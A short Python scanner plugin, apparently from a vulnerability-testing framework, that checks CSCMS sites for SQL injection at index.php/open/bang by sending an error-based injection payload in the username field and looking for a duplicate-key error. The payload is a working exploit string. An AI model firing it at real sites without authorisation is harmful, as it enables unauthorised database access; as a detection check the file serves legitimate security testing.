#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = '1c3z'
#ref http://www.wooyun.org/bugs/wooyun-2014-060122
def assign(service, arg):
    if service == "cscms":
        return True, arg

def audit(arg):
    url = arg + "index.php/open/bang"
    payload = "openid=x&denglu=login&username=a%27 and(select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1#&userpass=testvul"
    code, head, res, errcode,finalurl =  curl.curl(url + " -d '" + payload +"'")
    if res.find("for key 'group_key'") != -1:
        security_hole('find sql injection: ' + url+payload)
if __name__ == '__main__':
    from dummy import *
    audit(assign('cscms', 'http://127.0.0.1/cscms/')[1])